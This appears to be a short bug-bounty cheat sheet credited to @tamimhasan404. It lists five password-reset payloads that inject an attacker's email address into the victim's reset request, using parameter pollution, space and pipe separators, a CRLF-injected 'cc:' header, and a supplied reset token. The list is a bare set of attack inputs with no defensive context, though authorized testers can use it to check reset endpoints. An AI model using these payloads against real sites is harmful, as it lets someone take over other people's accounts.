
```
1. email= victim@gmail.com&email=attacker@gmil.com
2. email= victim@gmail.com%20email=attacker@gmil.com
3. email= victim@gmail.com |email=attacker@gmil.com
4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
5. email= victim@gmail.com&code= my password reset token
```
### Authors

@tamimhasan404
